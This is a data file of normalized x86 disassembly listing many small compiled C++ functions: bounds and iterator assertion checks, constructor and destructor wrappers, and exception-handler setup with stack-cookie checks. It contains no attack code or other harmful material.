push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41a787
push ebp
mov ebp esp
mov cl [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] cl
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41a808
push ebp
mov ebp esp
mov ecx [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41a889
push ebp
mov ebp esp
mov ecx [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41a90a
push edi
mov edi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
retn
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41a980
push edi
mov edi ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
retn
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41a9f6
push ebp
mov ebp esp
mov cl [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] cl
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41aa77
push ebp
mov ebp esp
mov cl [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] cl
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41aaf8
push ebp
mov ebp esp
mov cl [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] cl
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41ab79
push ebp
mov ebp esp
mov cl [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] cl
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41abfa
push ebp
mov ebp esp
mov ecx [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41ac7b
push ebp
mov ebp esp
mov ecx [ ecx ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi ] ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] 0x0
cmp eax edi
jbe r-xdata
test edi edi
mov edi r--data
jne r-xdata
push 0x4f
push r--data
push r--data
call sub_4258e2
add esp 0xc
test ebx ebx
je r-xdata
push 0x50
push edi
push r--data
call sub_4258e2
add esp 0xc
push 0x51
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x3ffffffe
jne r-xdata
mov eax esi
pop edi
pop ebp
retn 0x4
push 0x52
push edi
push r--data
call sub_4258e2
add esp 0xc
cmp ebx 0x1
je r-xdata
sub_41acfc
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41ae0e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41ad1c
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41ae3e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41ad4a
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41ae6e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41ad78
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41ae9e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41ada4
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41aedd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_41add0
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41adef
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi eax
call sub_404720
mov eax esi
call sub_415b35
mov [ esi + 0x1c ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41ae0e
push 0x0
mov eax sub_44a2ff
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41ae3e
push 0x0
mov eax sub_44a2dc
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41ae6e
push 0x0
mov eax sub_44a2b9
call sub_448595
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
mov [ edi ] r--data
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41ae9e
push 0x0
mov eax sub_44ad02
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x2c ]
mov [ edi ] r--data
call sub_41472b
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41aedd
push 0x0
mov eax sub_44acd4
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ edi + 0x2c ]
mov [ edi ] r--data
call sub_41472b
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41af1f
push 0x2c
mov eax sub_44d059
call sub_448595
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosb [ edi ]
push [ ebp - 0x10 ]
lea edi [ ebp - 0x14 ]
stosb [ edi ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_41b1c9
call sub_44866d
retn 0xc
push 0xa
mov eax r--data
lea esi [ ebp - 0x38 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x76
push r--data
push r--data
push eax
call sub_405e22
sub_41af7a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
push esi
push edi
mov esi eax
call sub_40dcdf
mov ecx [ esi + 0x28 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ esp + 0x8 ]
stosb [ edi ]
push [ esp + 0x8 ]
lea edi [ esp + 0x10 ]
stosb [ edi ]
push [ esp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41b1f6
push 0x8
add esi 0x8
pop ecx
push [ ebp + 0x8 ]
lea edi [ esp + 0x14 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
lea edx [ esp + 0x14 ]
call sub_41c72d
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_41afdb
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
push esi
push edi
mov esi eax
call sub_40dcdf
mov ecx [ esi + 0x28 ]
cmp ecx [ eax ]
jne r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
lea edi [ esp + 0x8 ]
stosb [ edi ]
push [ esp + 0x8 ]
lea edi [ esp + 0x10 ]
stosb [ edi ]
push [ esp + 0x10 ]
push [ ebp + 0x8 ]
call sub_41b222
push 0x8
add esi 0x8
pop ecx
push [ ebp + 0x8 ]
lea edi [ esp + 0x14 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
lea edx [ esp + 0x14 ]
call sub_41c7a7
pop ecx
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_41b03c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44d029
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov edi ecx
mov esi edx
mov [ esp + 0x14 ] ebx
call sub_40dcdf
mov ecx [ edi + 0x40 ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
lea edi [ esp + 0x14 ]
stosb [ edi ]
push [ esp + 0x14 ]
lea edi [ esp + 0x1c ]
stosb [ edi ]
push [ esp + 0x1c ]
mov ecx ebx
push esi
call sub_41b24e
lea eax [ edi + 0x8 ]
lea ebx [ esp + 0x1c ]
call sub_416f3f
and [ esp + 0x68 ] 0x0
mov edi [ esp + 0x14 ]
mov eax ebx
push eax
push esi
call sub_41c821
or [ esp + 0x70 ] 0xffffffff
pop ecx
pop ecx
lea esi [ esp + 0x40 ]
call sub_41472b
jmp r-xdata
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn 0xc
sub_41b0f9
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44cff9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov edi ecx
mov esi edx
mov [ esp + 0x14 ] ebx
call sub_40dcdf
mov ecx [ edi + 0x40 ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
lea edi [ esp + 0x14 ]
stosb [ edi ]
push [ esp + 0x14 ]
lea edi [ esp + 0x1c ]
stosb [ edi ]
push [ esp + 0x1c ]
mov ecx ebx
push esi
call sub_41b27a
lea eax [ edi + 0x8 ]
lea ebx [ esp + 0x1c ]
call sub_416f3f
and [ esp + 0x68 ] 0x0
mov edi [ esp + 0x14 ]
mov eax ebx
push eax
push esi
call sub_41c8c5
or [ esp + 0x70 ] 0xffffffff
pop ecx
pop ecx
lea esi [ esp + 0x40 ]
call sub_41472b
jmp r-xdata
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_4247dc
mov esp ebp
pop ebp
retn 0xc
sub_41b1c9
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_41b1f6
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
push esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
cmp [ ecx ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
jmp r-xdata
pop ecx
pop esi
pop ebp
retn 0xc
sub_41b222
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
push esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
cmp [ ecx ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
jmp r-xdata
pop ecx
pop esi
pop ebp
retn 0xc
sub_41b24e
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
push esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
cmp [ ecx ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
jmp r-xdata
pop ecx
pop esi
pop ebp
retn 0xc
sub_41b27a
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
push esi
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
cmp [ ecx ] 0x0
je r-xdata
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
jmp r-xdata
pop ecx
pop esi
pop ebp
retn 0xc
sub_41b3c1
push ebp
mov ebp esp
push esi
xor esi esi
push esi
call sub_40b924
cmp [ eax ] esi
jmp r-xdata
pop ecx
jne r-xdata
push esi
call sub_40b924
push [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call sub_41fae7
pop ecx
pop ecx
test al al
jne r-xdata
xor eax eax
push esi
call sub_40b924
mov ax [ eax + 0x4 ]
pop ecx
jmp r-xdata
inc esi
push esi
call sub_40b924
cmp [ eax ] 0x0
pop esi
pop ebp
retn
sub_41b487
push 0x0
mov eax sub_44aca6
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi ebx
mov [ edi ] 0x1
call sub_41cad0
xor edx edx
mov [ edi + 0x4 ] edx
mov [ edi + 0x8 ] edx
mov eax [ ebx ]
cmp eax edx
je r-xdata
mov [ edi + 0xc ] eax
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov [ ebp - 0x4 ] edx
cmp eax edx
je r-xdata
xor esi esi
lea ecx [ eax + 0x4 ]
inc esi
[ ecx ] esi
mov esi ebx
call sub_41cad0
add eax 0x8
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41b53b
push 0x0
mov eax sub_44ac80
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41caef
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41caef
add eax 0x28
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41b5ac
push 0x0
mov eax sub_44ac5a
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41cb0e
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41cb0e
add eax 0x28
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41b61d
push 0x0
mov eax sub_44ac34
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41cb2d
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41cb2d
add eax 0x40
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41b68e
push 0x0
mov eax sub_44ac0e
call sub_448595
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
xor ebx ebx
inc ebx
mov [ edi ] bl
call sub_41cb4c
mov eax esi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov eax [ eax ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
mov edx ebx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
[ ecx ] ebx
mov esi [ ebp + 0xc ]
call sub_41cb4c
add eax 0x40
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x8
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_41b711
push ebp
mov ebp esp
push esi
mov esi eax
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
call sub_407e47
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
pop esi
pop ebp
retn 0xc
sub_41b74f
push ebp
mov ebp esp
push ebx
push esi
mov bl al
mov esi ecx
call sub_410a44
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
test bl bl
je r-xdata
movzx ecx [ ebp + 0x8 ]
push edi
lea edi [ esi + 0x8 ]
call sub_419dc1
pop edi
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x204 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp + 0x8 ] al
sub_41b798
push ebp
mov ebp esp
cmp [ eax + 0x18 ] 0x0
je r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov ecx [ eax ]
cmp ecx [ eax + 0xc ]
je r-xdata
mov cl [ ebp + 0x8 ]
xor eax eax
cmp cl [ ebp + 0xc ]
setne al
pop ebp
retn
mov ecx [ eax ]
cmp ecx [ eax + 0x10 ]
jne r-xdata
xor al al
pop ebp
retn
mov [ eax + 0x1d ] 0x1
sub_41b7ca
push ebp
mov ebp esp
cmp [ eax + 0x18 ] 0x0
je r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
mov ecx [ eax ]
cmp ecx [ eax + 0xc ]
je r-xdata
mov cl [ ebp + 0x8 ]
xor eax eax
cmp cl [ ebp + 0xc ]
sete al
pop ebp
retn
mov ecx [ eax ]
cmp ecx [ eax + 0x10 ]
jne r-xdata
mov al 0x1
pop ebp
retn
mov [ eax + 0x1d ] 0x1
sub_41b7fc
push ebp
mov ebp esp
xor ecx ecx
cmp [ eax + 0x18 ] cl
je r-xdata
cmp [ ebp + 0x8 ] cl
jne r-xdata
mov edx [ eax ]
cmp edx [ eax + 0xc ]
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0xc ] cl
je r-xdata
xor al al
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_41b824
push ebp
mov ebp esp
xor ecx ecx
cmp [ eax + 0x19 ] cl
je r-xdata
cmp [ ebp + 0x8 ] cl
je r-xdata
mov edx [ eax ]
cmp edx [ eax + 0x10 ]
jne r-xdata
xor eax eax
pop ebp
retn
cmp [ ebp + 0xc ] cl
jne r-xdata
mov [ eax + 0x1d ] 0x1
xor al al
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_41b850
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
inc ebx
cmp ebx 0xff
jbe r-xdata
mov edi [ ebp + 0x8 ]
add edi 0x8
mov ecx ebx
call sub_419dc1
mov ecx [ ebp + 0x14 ]
movzx eax bl
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
xor ecx ecx
cmp cx ax
setne al
cmp [ ebp + 0x10 ] al
je r-xdata
pop edi
pop ebx
pop ebp
retn 0x10
sub_41b88f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x20 ]
lea esi [ edi + 0x2c ]
mov edx [ esi ]
cmp edx [ eax ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edi
push eax
call sub_41c9d0
call sub_407e47
mov edx [ eax ]
push ebx
mov ecx eax
call [ edx + 0x4 ]
movzx eax al
push eax
push edi
call sub_41ca19
mov eax [ ebx + 0x4 ]
mov edx [ ebx ]
cmp edx [ eax + 0x10 ]
jne r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_41b8de
push 0xc
mov eax sub_44a296
call sub_448595
mov esi ecx
cmp [ esi + 0x4 ] 0x0
mov ebx [ edi ]
mov [ ebp - 0x10 ] ebx
je r-xdata
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
lea ebx [ edi + 0x1d ]
mov al [ ebx ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] al
and [ ebp - 0x4 ] 0x0
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
xor al al
mov ecx [ ebp + 0x8 ]
mov [ edi ] ebx
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
xor al al
cmp [ edi ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov al [ ebp - 0x14 ]
mov [ ebx ] al
mov ebx [ ebp - 0x10 ]
mov al 0x1
jmp r-xdata
call sub_44866d
retn 0x8
push 0x59
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov cl [ ebp - 0x14 ]
mov [ ebx ] cl
jmp r-xdata
sub_41b984
push 0x40
mov eax sub_44a273
call sub_448595
mov ebx ecx
mov eax [ ebx ]
mov esi ebx
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x14 ] eax
call sub_41fb84
push 0x6
pop ecx
mov esi eax
lea edi [ ebp - 0x34 ]
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
call sub_407e47
mov edx [ eax ]
push ebx
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
lea edi [ ebx + 0x1d ]
mov al [ edi ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] al
and [ ebp - 0x4 ] 0x0
call sub_407e47
mov edx [ eax ]
push ebx
mov ecx eax
call [ edx + 0x4 ]
test al al
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x38 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebx + 0x3c ] eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp - 0x2c ]
mov [ ebx + 0x38 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebx + 0x3c ] eax
and [ eax ] 0x0
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
lea eax [ ebp - 0x34 ]
je r-xdata
